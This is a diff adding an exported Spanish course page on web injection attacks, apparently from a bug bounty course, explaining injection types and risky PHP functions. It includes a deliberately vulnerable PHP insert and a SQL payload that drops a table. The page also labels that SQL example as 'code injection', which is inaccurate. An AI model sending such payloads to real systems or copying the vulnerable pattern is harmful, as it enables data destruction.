@@ -1,0 +1,769 @@
+<script>
+	document.addEventListener('DOMContentLoaded', function() {
+	var links = document.querySelectorAll('a');
+	for (var i = 0; i < links.length; i++) {
+	links[i].setAttribute('target', '_blank');
+	}
+		
+	const elementosConClaseImage = document.querySelectorAll('.image');
+	
+		// Recorre los elementos y quita la propiedad "href" de las etiquetas <a> dentro de ellos
+		elementosConClaseImage.forEach(elemento => {
+		const etiquetasA = elemento.querySelectorAll('a');
+		etiquetasA.forEach(etiqueta => {
+			etiqueta.removeAttribute('href');
+		});
+		});
+	});
+	</script>
+<html oncontextmenu="return false"><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>Módulo 12 - Inyección</title><style>
+/* cspell:disable-file */
+/* webkit printing magic: print all background colors */
+html {
+	-webkit-print-color-adjust: exact;
+	user-select: none;
+}
+* {
+	box-sizing: border-box;
+	-webkit-print-color-adjust: exact;
+}
+
+html,
+body {
+	margin: 0;
+	padding: 0;
+}
+@media only screen {
+	body {
+		margin: 2em auto;
+		max-width: 900px;
+		color: rgb(55, 53, 47);
+	}
+}
+
+body {
+	line-height: 1.5;
+	white-space: pre-wrap;
+}
+
+a,
+a.visited {
+	color: inherit;
+	text-decoration: underline;
+}
+
+.pdf-relative-link-path {
+	font-size: 80%;
+	color: #444;
+}
+
+h1,
+h2,
+h3 {
+	letter-spacing: -0.01em;
+	line-height: 1.2;
+	font-weight: 600;
+	margin-bottom: 0;
+}
+
+.page-title {
+	font-size: 2.5rem;
+	font-weight: 700;
+	margin-top: 0;
+	margin-bottom: 0.75em;
+}
+
+h1 {
+	font-size: 1.875rem;
+	margin-top: 1.875rem;
+}
+
+h2 {
+	font-size: 1.5rem;
+	margin-top: 1.5rem;
+}
+
+h3 {
+	font-size: 1.25rem;
+	margin-top: 1.25rem;
+}
+
+.source {
+	border: 1px solid #ddd;
+	border-radius: 3px;
+	padding: 1.5em;
+	word-break: break-all;
+}
+
+.callout {
+	border-radius: 3px;
+	padding: 1rem;
+}
+
+figure {
+	margin: 1.25em 0;
+	page-break-inside: avoid;
+}
+
+figcaption {
+	opacity: 0.5;
+	font-size: 85%;
+	margin-top: 0.5em;
+}
+
+mark {
+	background-color: transparent;
+}
+
+.indented {
+	padding-left: 1.5em;
+}
+
+hr {
+	background: transparent;
+	display: block;
+	width: 100%;
+	height: 1px;
+	visibility: visible;
+	border: none;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.09);
+}
+
+img {
+	max-width: 100%;
+	user-select: none;
+}
+
+@media only print {
+	img {
+		max-height: 100vh;
+		object-fit: contain;
+	}
+}
+
+@page {
+	margin: 1in;
+}
+
+.collection-content {
+	font-size: 0.875rem;
+}
+
+.column-list {
+	display: flex;
+	justify-content: space-between;
+}
+
+.column {
+	padding: 0 1em;
+}
+
+.column:first-child {
+	padding-left: 0;
+}
+
+.column:last-child {
+	padding-right: 0;
+}
+
+.table_of_contents-item {
+	display: block;
+	font-size: 0.875rem;
+	line-height: 1.3;
+	padding: 0.125rem;
+}
+
+.table_of_contents-indent-1 {
+	margin-left: 1.5rem;
+}
+
+.table_of_contents-indent-2 {
+	margin-left: 3rem;
+}
+
+.table_of_contents-indent-3 {
+	margin-left: 4.5rem;
+}
+
+.table_of_contents-link {
+	text-decoration: none;
+	opacity: 0.7;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.18);
+}
+
+table,
+th,
+td {
+	border: 1px solid rgba(55, 53, 47, 0.09);
+	border-collapse: collapse;
+}
+
+table {
+	border-left: none;
+	border-right: none;
+}
+
+th,
+td {
+	font-weight: normal;
+	padding: 0.25em 0.5em;
+	line-height: 1.5;
+	min-height: 1.5em;
+	text-align: left;
+}
+
+th {
+	color: rgba(55, 53, 47, 0.6);
+}
+
+ol,
+ul {
+	margin: 0;
+	margin-block-start: 0.6em;
+	margin-block-end: 0.6em;
+}
+
+li > ol:first-child,
+li > ul:first-child {
+	margin-block-start: 0.6em;
+}
+
+ul > li {
+	list-style: disc;
+}
+
+ul.to-do-list {
+	padding-inline-start: 0;
+}
+
+ul.to-do-list > li {
+	list-style: none;
+}
+
+.to-do-children-checked {
+	text-decoration: line-through;
+	opacity: 0.375;
+}
+
+ul.toggle > li {
+	list-style: none;
+}
+
+ul {
+	padding-inline-start: 1.7em;
+}
+
+ul > li {
+	padding-left: 0.1em;
+}
+
+ol {
+	padding-inline-start: 1.6em;
+}
+
+ol > li {
+	padding-left: 0.2em;
+}
+
+.mono ol {
+	padding-inline-start: 2em;
+}
+
+.mono ol > li {
+	text-indent: -0.4em;
+}
+
+.toggle {
+	padding-inline-start: 0em;
+	list-style-type: none;
+}
+
+/* Indent toggle children */
+.toggle > li > details {
+	padding-left: 1.7em;
+}
+
+.toggle > li > details > summary {
+	margin-left: -1.1em;
+}
+
+.selected-value {
+	display: inline-block;
+	padding: 0 0.5em;
+	background: rgba(206, 205, 202, 0.5);
+	border-radius: 3px;
+	margin-right: 0.5em;
+	margin-top: 0.3em;
+	margin-bottom: 0.3em;
+	white-space: nowrap;
+}
+
+.collection-title {
+	display: inline-block;
+	margin-right: 1em;
+}
+
+.page-description {
+    margin-bottom: 2em;
+}
+
+.simple-table {
+	margin-top: 1em;
+	font-size: 0.875rem;
+	empty-cells: show;
+}
+.simple-table td {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table th {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table-header-color {
+	background: rgb(247, 246, 243);
+	color: black;
+}
+.simple-table-header {
+	font-weight: 500;
+}
+
+time {
+	opacity: 0.5;
+}
+
+.icon {
+	display: inline-block;
+	max-width: 1.2em;
+	max-height: 1.2em;
+	text-decoration: none;
+	vertical-align: text-bottom;
+	margin-right: 0.5em;
+}
+
+img.icon {
+	border-radius: 3px;
+}
+
+.user-icon {
+	width: 1.5em;
+	height: 1.5em;
+	border-radius: 100%;
+	margin-right: 0.5rem;
+}
+
+.user-icon-inner {
+	font-size: 0.8em;
+}
+
+.text-icon {
+	border: 1px solid #000;
+	text-align: center;
+}
+
+.page-cover-image {
+	display: block;
+	object-fit: cover;
+	width: 100%;
+	max-height: 30vh;
+}
+
+.page-header-icon {
+	font-size: 3rem;
+	margin-bottom: 1rem;
+}
+
+.page-header-icon-with-cover {
+	margin-top: -0.72em;
+	margin-left: 0.07em;
+}
+
+.page-header-icon img {
+	border-radius: 3px;
+}
+
+.link-to-page {
+	margin: 1em 0;
+	padding: 0;
+	border: none;
+	font-weight: 500;
+}
+
+p > .user {
+	opacity: 0.5;
+}
+
+td > .user,
+td > time {
+	white-space: nowrap;
+}
+
+input[type="checkbox"] {
+	transform: scale(1.5);
+	margin-right: 0.6em;
+	vertical-align: middle;
+}
+
+p {
+	margin-top: 0.5em;
+	margin-bottom: 0.5em;
+}
+
+.image {
+	border: none;
+	margin: 1.5em 0;
+	padding: 0;
+	border-radius: 0;
+	text-align: center;
+}
+
+.code,
+code {
+	background: rgba(135, 131, 120, 0.15);
+	border-radius: 3px;
+	padding: 0.2em 0.4em;
+	border-radius: 3px;
+	font-size: 85%;
+	tab-size: 2;
+	user-select: all;
+}
+
+code {
+	color: #eb5757;
+}
+
+.code {
+	padding: 1.5em 1em;
+}
+
+.code-wrap {
+	white-space: pre-wrap;
+	word-break: break-all;
+}
+
+.code > code {
+	background: none;
+	padding: 0;
+	font-size: 100%;
+	color: inherit;
+}
+
+blockquote {
+	font-size: 1.25em;
+	margin: 1em 0;
+	padding-left: 1em;
+	border-left: 3px solid rgb(55, 53, 47);
+}
+
+.bookmark {
+	text-decoration: none;
+	max-height: 8em;
+	padding: 0;
+	display: flex;
+	width: 100%;
+	align-items: stretch;
+	overflow: auto;
+}
+
+.bookmark-title {
+	font-size: 0.85em;
+	overflow: hidden;
+	text-overflow: ellipsis;
+	height: 1.75em;
+	white-space: nowrap;
+}
+
+.bookmark-text {
+	display: flex;
+	flex-direction: column;
+}
+
+.bookmark-info {
+	flex: 4 1 180px;
+	padding: 12px 14px 14px;
+	display: flex;
+	flex-direction: column;
+	justify-content: space-between;
+}
+
+.bookmark-image {
+	width: 33%;
+	flex: 1 1 180px;
+	display: block;
+	position: relative;
+	object-fit: cover;
+	border-radius: 1px;
+}
+
+.bookmark-description {
+	color: rgba(55, 53, 47, 0.6);
+	font-size: 0.75em;
+	overflow: hidden;
+	max-height: 4.5em;
+	word-break: break-word;
+}
+
+.bookmark-href {
+	font-size: 0.75em;
+	margin-top: 0.25em;
+}
+
+.sans { font-family: ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol"; }
+.code { font-family: "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace; }
+.serif { font-family: Lyon-Text, Georgia, ui-serif, serif; }
+.mono { font-family: iawriter-mono, Nitti, Menlo, Courier, monospace; }
+.pdf .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK JP'; }
+.pdf:lang(zh-CN) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC'; }
+.pdf:lang(zh-TW) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK TC'; }
+.pdf:lang(ko-KR) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK KR'; }
+.pdf .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.pdf .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK JP'; }
+.pdf:lang(zh-CN) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK SC'; }
+.pdf:lang(zh-TW) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK TC'; }
+.pdf:lang(ko-KR) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK KR'; }
+.pdf .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.highlight-default {
+	color: rgba(55, 53, 47, 1);
+}
+.highlight-gray {
+	color: rgba(120, 119, 116, 1);
+	fill: rgba(120, 119, 116, 1);
+}
+.highlight-brown {
+	color: rgba(159, 107, 83, 1);
+	fill: rgba(159, 107, 83, 1);
+}
+.highlight-orange {
+	color: rgba(217, 115, 13, 1);
+	fill: rgba(217, 115, 13, 1);
+}
+.highlight-yellow {
+	color: rgba(203, 145, 47, 1);
+	fill: rgba(203, 145, 47, 1);
+}
+.highlight-teal {
+	color: rgba(68, 131, 97, 1);
+	fill: rgba(68, 131, 97, 1);
+}
+.highlight-blue {
+	color: rgba(51, 126, 169, 1);
+	fill: rgba(51, 126, 169, 1);
+}
+.highlight-purple {
+	color: rgba(144, 101, 176, 1);
+	fill: rgba(144, 101, 176, 1);
+}
+.highlight-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.highlight-red {
+	color: rgba(212, 76, 71, 1);
+	fill: rgba(212, 76, 71, 1);
+}
+.highlight-gray_background {
+	background: rgba(241, 241, 239, 1);
+}
+.highlight-brown_background {
+	background: rgba(244, 238, 238, 1);
+}
+.highlight-orange_background {
+	background: rgba(251, 236, 221, 1);
+}
+.highlight-yellow_background {
+	background: rgba(251, 243, 219, 1);
+}
+.highlight-teal_background {
+	background: rgba(237, 243, 236, 1);
+}
+.highlight-blue_background {
+	background: rgba(231, 243, 248, 1);
+}
+.highlight-purple_background {
+	background: rgba(244, 240, 247, 0.8);
+}
+.highlight-pink_background {
+	background: rgba(249, 238, 243, 0.8);
+}
+.highlight-red_background {
+	background: rgba(253, 235, 236, 1);
+}
+.block-color-default {
+	color: inherit;
+	fill: inherit;
+}
+.block-color-gray {
+	color: rgba(120, 119, 116, 1);
+	fill: rgba(120, 119, 116, 1);
+}
+.block-color-brown {
+	color: rgba(159, 107, 83, 1);
+	fill: rgba(159, 107, 83, 1);
+}
+.block-color-orange {
+	color: rgba(217, 115, 13, 1);
+	fill: rgba(217, 115, 13, 1);
+}
+.block-color-yellow {
+	color: rgba(203, 145, 47, 1);
+	fill: rgba(203, 145, 47, 1);
+}
+.block-color-teal {
+	color: rgba(68, 131, 97, 1);
+	fill: rgba(68, 131, 97, 1);
+}
+.block-color-blue {
+	color: rgba(51, 126, 169, 1);
+	fill: rgba(51, 126, 169, 1);
+}
+.block-color-purple {
+	color: rgba(144, 101, 176, 1);
+	fill: rgba(144, 101, 176, 1);
+}
+.block-color-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.block-color-red {
+	color: rgba(212, 76, 71, 1);
+	fill: rgba(212, 76, 71, 1);
+}
+.block-color-gray_background {
+	background: rgba(241, 241, 239, 1);
+}
+.block-color-brown_background {
+	background: rgba(244, 238, 238, 1);
+}
+.block-color-orange_background {
+	background: rgba(251, 236, 221, 1);
+}
+.block-color-yellow_background {
+	background: rgba(251, 243, 219, 1);
+}
+.block-color-teal_background {
+	background: rgba(237, 243, 236, 1);
+}
+.block-color-blue_background {
+	background: rgba(231, 243, 248, 1);
+}
+.block-color-purple_background {
+	background: rgba(244, 240, 247, 0.8);
+}
+.block-color-pink_background {
+	background: rgba(249, 238, 243, 0.8);
+}
+.block-color-red_background {
+	background: rgba(253, 235, 236, 1);
+}
+.select-value-color-uiBlue { background-color: rgba(35, 131, 226, .07); }
+.select-value-color-pink { background-color: rgba(245, 224, 233, 1); }
+.select-value-color-purple { background-color: rgba(232, 222, 238, 1); }
+.select-value-color-green { background-color: rgba(219, 237, 219, 1); }
+.select-value-color-gray { background-color: rgba(227, 226, 224, 1); }
+.select-value-color-translucentGray { background-color: rgba(255, 255, 255, 0.0375); }
+.select-value-color-orange { background-color: rgba(250, 222, 201, 1); }
+.select-value-color-brown { background-color: rgba(238, 224, 218, 1); }
+.select-value-color-red { background-color: rgba(255, 226, 221, 1); }
+.select-value-color-yellow { background-color: rgba(253, 236, 200, 1); }
+.select-value-color-blue { background-color: rgba(211, 229, 239, 1); }
+.select-value-color-pageGlass { background-color: undefined; }
+.select-value-color-washGlass { background-color: undefined; }
+
+.checkbox {
+	display: inline-flex;
+	vertical-align: text-bottom;
+	width: 16;
+	height: 16;
+	background-size: 16px;
+	margin-left: 2px;
+	margin-right: 5px;
+}
+
+.checkbox-on {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20width%3D%2216%22%20height%3D%2216%22%20fill%3D%22%2358A9D7%22%2F%3E%0A%3Cpath%20d%3D%22M6.71429%2012.2852L14%204.9995L12.7143%203.71436L6.71429%209.71378L3.28571%206.2831L2%207.57092L6.71429%2012.2852Z%22%20fill%3D%22white%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+
+.checkbox-off {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+	
+</style></head><body><article id="9fa69e09-4d83-452d-b17a-93f7288e4d65" class="page sans"><header><img class="page-cover-image" src="https://images.unsplash.com/photo-1611689102192-1f6e0e52df0a?ixlib=rb-4.0.3&amp;q=85&amp;fm=jpg&amp;crop=entropy&amp;cs=srgb" style="object-position:center 50%"/><div class="page-header-icon page-header-icon-with-cover"><span class="icon">🧪</span></div><h1 class="page-title"><strong><strong>Módulo 12 - Inyección</strong></strong></h1><p class="page-description"></p></header><div class="page-body"><p id="dd29bca0-18e5-4872-8709-20f009389abb" class="">
+</p><p id="d54a68ee-afaf-4111-bd88-840b71a0f0f1" class="">La inyección en un sitio web es una técnica de ataque utilizada para insertar cadenas de texto, comandos, consultas o código malicioso en una aplicación web, con el fin de obtener acceso no autorizado o realizar acciones no deseadas en el servidor o en el navegador de los usuarios.</p><p id="ea2f6e13-52c4-47b1-9ee5-cc1d398fa224" class="">Un ejemplo común de inyección es la inyección SQL, que aprovecha las vulnerabilidades en las aplicaciones que utilizan bases de datos, como las aplicaciones de comercio electrónico o de banca en línea. En este tipo de ataque, los atacantes introducen comandos SQL maliciosos en formularios de entrada de datos, como campos de búsqueda o comentarios, con el objetivo de que esos comandos se ejecuten en la base de datos del servidor. Si el ataque tiene éxito, los atacantes pueden obtener acceso no autorizado a datos confidenciales, como nombres de usuario, contraseñas, información de tarjetas de crédito y otra información personal.</p><p id="73a859ef-c851-4582-ac49-7c84fb9941f1" class="">Otro ejemplo es la inyección de código malicioso en el servidor web, que se conoce como inyección de código. Este tipo de ataque implica la introducción de código malicioso en scripts y programas en el servidor web, lo que permite a los atacantes ejecutar su propio código en el servidor. Los atacantes pueden utilizar este método para tomar el control del servidor, robar datos, modificar archivos y realizar otras actividades maliciosas.</p><h1 id="11f43170-6f36-4871-9ee0-6fc49c8db05c" class="">Tipos de Inyección</h1><p id="c92dff59-4e96-413a-8d6d-5718e1b897e8" class="">A continuación se presentan los posibles tipos de inyección en un sitio web:</p><ul id="81ba569e-b5e7-4863-af2a-5a095f11cbe7" class="bulleted-list"><li style="list-style-type:disc"><strong>Cross-Site Scripting (XSS) Injection:</strong> Permite a un atacante insertar código malicioso en las páginas web del sitio web que se ejecuta en el navegador de los usuarios.</li></ul><ul id="b3a6b442-4b28-4858-939a-b74e51671ab1" class="bulleted-list"><li style="list-style-type:disc"><strong>SQL Injection:</strong> Permite a un atacante ejecutar comandos SQL no autorizados en la base de datos del sitio web.</li></ul><ul id="cb79dfa8-dbdd-44c4-949b-bef1f9969698" class="bulleted-list"><li style="list-style-type:disc"><strong>Code Injection:</strong> Permite a un atacante ejecutar su propio código malicioso en el servidor del sitio web.</li></ul><ul id="ce50cfa4-9f44-4d42-b870-d910e60d2a9f" class="bulleted-list"><li style="list-style-type:disc"><strong>Command Injection:</strong> Permite a un atacante ejecutar comandos maliciosos en el servidor del sitio web.</li></ul><ul id="0cddecb6-50b6-4242-80c9-8508be3d5d78" class="bulleted-list"><li style="list-style-type:disc"><strong>LDAP Injection:</strong> Permite a un atacante ejecutar comandos LDAP no autorizados en el servidor del sitio web.</li></ul><ul id="d534b907-63cb-4843-8fe1-073caa62019c" class="bulleted-list"><li style="list-style-type:disc"><strong>XPath Injection:</strong> Permite a un atacante ejecutar comandos XPath no autorizados en el servidor del sitio web.</li></ul><ul id="9df41cad-ed29-4e7a-beef-2f15d99f18f3" class="bulleted-list"><li style="list-style-type:disc"><strong>Remote File Inclusion (RFI) Injection:</strong> Permite a un atacante incluir archivos remotos en el servidor del sitio web.</li></ul><ul id="d284ae96-1546-4cb1-8a55-03c06e956f63" class="bulleted-list"><li style="list-style-type:disc"><strong>Local File Inclusion (LFI) Injection:</strong> Permite a un atacante incluir archivos locales en el servidor del sitio web.</li></ul><p id="8ed11907-ecfb-4bca-8ff5-5a1d6f5edc73" class="">
+</p><figure class="block-color-gray_background callout" style="white-space:pre-wrap;display:flex" id="aeeec497-fc29-4a80-b869-0c5fcfa3368a"><div style="font-size:1.5em"><span class="icon">👉🏻</span></div><div style="width:100%"><mark class="highlight-blue">Los tipos de Inyección mas comunes como por ejemplo el XSS (Cross Site Scripting) y el SQLi (SQL Injection) son tan profundos y comunes que les hemos dado módulos específicos dentro del curso; en este Módulo hablaremos de los demás tipos de inyección.</mark></div></figure><h2 id="723ddd72-06a5-41c0-b493-f94b93c607c0" class="">Code Injection (Inyección de Código)</h2><p id="312e5665-ad06-496f-a9f7-9a84e27b877e" class="">El code injection es una técnica de ataque en la que un atacante introduce código malicioso en un sitio web. Este código puede ser utilizado para ejecutar comandos en el servidor WEB, robar información confidencial o incluso tomar el control completo del servidor.</p><p id="43fb5e90-a02b-4ec2-b97d-4de365892f23" class="">Un ejemplo común de code injection es cuando un atacante introduce código en un formulario de entrada de datos, como un campo de búsqueda o un comentario en un blog. Si la aplicación web no está protegida adecuadamente, el código malicioso puede ser ejecutado en el servidor. Por ejemplo, si el sitio web utiliza PHP, un atacante podría introducir código PHP malicioso en el campo de entrada. Si la aplicación web no valida o filtra adecuadamente el contenido del campo de entrada, el código malicioso podría ser ejecutado en el servidor, lo que permite al atacante tomar el control del servidor.</p><p id="a2d4d4a7-09b3-4b81-96bc-b80777563ac2" class="">Para prevenir el code injection, es importante validar y filtrar adecuadamente los datos de entrada en la aplicación web. También es importante restringir el acceso a los archivos y directorios sensibles del servidor, y asegurarse de que la aplicación web se ejecute con los permisos de usuario más bajos o limitados posibles. </p><p id="73b00eb0-9ff7-4d64-b14e-184b75983531" class="">En la siguiente imagen, vemos los pasos recomendados dentro de la metodología de Bug Bounty para probar distintos tipos de inyección:</p><p id="591be97c-b098-4f94-8ffa-3732348a77f0" class=""> </p><figure id="f239e907-1eca-48da-b6fb-f2b06a7f0f0f" class="image"><a href="Mo%CC%81dulo%2012%20-%20Inyeccio%CC%81n%209fa69e094d83452db17a93f7288e4d65/Metodologia_de_Ataque_para_Code_Injection.png"><img style="width:720px" src="Mo%CC%81dulo%2012%20-%20Inyeccio%CC%81n%209fa69e094d83452db17a93f7288e4d65/Metodologia_de_Ataque_para_Code_Injection.png"/></a><figcaption>Imagen: Pasos de la Metodologia de Pruebas de Inyección</figcaption></figure><p id="79dd3cb1-d4f5-4ab8-9e64-4011d2844502" class="">
+</p><p id="14ed5469-1e8e-418f-aa27-5b1b6ec01d01" class="">Aquí tenemos algunos ejemplos relacionados con funciones y parámetros que podrían ser proclives a la inyección de código en un sitio WEB:</p><ul id="3f5999d9-0675-42b7-9748-c2d4a5233c50" class="bulleted-list"><li style="list-style-type:disc"><strong>eval()</strong>: Esta función toma una cadena como argumento y la ejecuta como código PHP. Si un atacante puede controlar la entrada a esta función, puede ejecutar código PHP arbitrario en el servidor.</li></ul><ul id="b6b452a4-99bb-4393-825b-e91282e6671e" class="bulleted-list"><li style="list-style-type:disc"><strong>include(), require(), include_once(), require_once():</strong> Estas funciones permiten incluir y ejecutar el contenido de un archivo especificado. Si un atacante puede controlar el nombre o la ruta del archivo, puede hacer que el servidor ejecute código malicioso desde una fuente externa.</li></ul><ul id="ec271597-24a7-4616-92bc-4765bbc63d04" class="bulleted-list"><li style="list-style-type:disc"><strong>create_function():</strong> Esta función crea una función anónima a partir de los parámetros y el código dados como cadenas. Si un atacante puede inyectar código en alguno de estos parámetros, puede crear una función maliciosa que se ejecute en el servidor.</li></ul><ul id="1cebab42-c969-49f3-9e23-bec9d147a0b2" class="bulleted-list"><li style="list-style-type:disc"><strong>preg_replace():</strong> Esta función realiza una búsqueda y sustitución de una expresión regular. Si se usa el modificador /e, el segundo parámetro se evalúa como código PHP. Si un atacante puede inyectar código en este parámetro, puede ejecutarlo en el servidor.</li></ul><ul id="217fd8ca-1b92-4487-ade2-5496a26e4b0e" class="bulleted-list"><li style="list-style-type:disc"><strong>assert():</strong> Esta función comprueba si una afirmación es verdadera y ejecuta el código especificado si no lo es. Si un atacante puede inyectar código en la afirmación, puede ejecutarlo en el servidor.</li></ul><ul id="b33c1b35-bf10-48bb-919e-82109a58654d" class="bulleted-list"><li style="list-style-type:disc"><strong>Inyección de JavaScript en el lado del servidor en Node.js:</strong> Esto ocurre cuando un atacante puede inyectar código JavaScript en una aplicación Node.js y hacer que sea ejecutado por el intérprete Node.js. Esto puede conducir a la ejecución remota de código, denegación de servicio o divulgación de información.</li></ul><p id="506df9fb-9549-46b1-912b-f272ae13c8bc" class="">
+</p><p id="f412e845-aeaf-4f5a-a063-8632a928313b" class="">Un ejemplo de código vulnerable a code injection en PHP sería el siguiente:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="56cd4e0e-7f33-4614-9e2a-0ba0e327aedb" class="code code-wrap"><code class="language-Plain Text">&lt;?php
+  $nombre = $_POST[&#x27;nombre&#x27;];
+  $apellido = $_POST[&#x27;apellido&#x27;];
+  $sql = &quot;INSERT INTO usuarios (nombre, apellido) VALUES (&#x27;$nombre&#x27;, &#x27;$apellido&#x27;)&quot;;
+  mysqli_query($conn, $sql);
+?&gt;
+</code></pre><p id="fab47396-0f11-425a-aa0c-3f7d014d4f92" class="">En este código, el usuario puede enviar valores maliciosos a través de los campos de entrada <code>nombre</code> y <code>apellido</code>, lo que permite la inyección de código. Por ejemplo, si el usuario envía el valor <code>&#x27;Foo&#x27;); DROP TABLE usuarios; --&#x27;</code> en el campo <code>apellido</code>, se ejecutará el siguiente comando SQL malicioso:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="3cbc2e6d-4dff-4923-8bd4-0484079e5c6f" class="code code-wrap"><code class="language-Plain Text">INSERT INTO usuarios (nombre, apellido) VALUES (&#x27;Foo&#x27;, &#x27;&#x27;); DROP TABLE usuarios; --&#x27;)
+</code></pre><p id="5d7999a4-29c0-4ea2-95b2-850d42997e0f" class="">Este comando eliminará la tabla <code>usuarios</code> de la base de datos, lo que puede causar daños irreparables en la aplicación web. Para prevenir este tipo de ataque, es importante validar y filtrar adecuadamente los datos de entrada del usuario en la aplicación web.</p><h3 id="2549f397-dc64-40af-9e42-a1614d0badc2" class="">Prevención de vulnerabilidades Code Injection</h3><ul id="a7e2f9a1-ad40-4eb6-9051-395c95fe05e2" class="bulleted-list"><li style="list-style-type:disc">Validar los datos de entrada del usuario para asegurarse de que contengan sólo los caracteres permitidos. Por ejemplo, si un campo de entrada debe contener sólo números, la aplicación web debe asegurarse de que el campo no contenga caracteres alfabéticos o especiales. </li></ul><ul id="b6f12482-5e4e-4743-828c-b7955a6505d4" class="bulleted-list"><li style="list-style-type:disc">Si un campo de entrada debe contener sólo texto, la aplicación web debe asegurarse de que el campo no contenga caracteres numéricos o especiales.</li></ul><ul 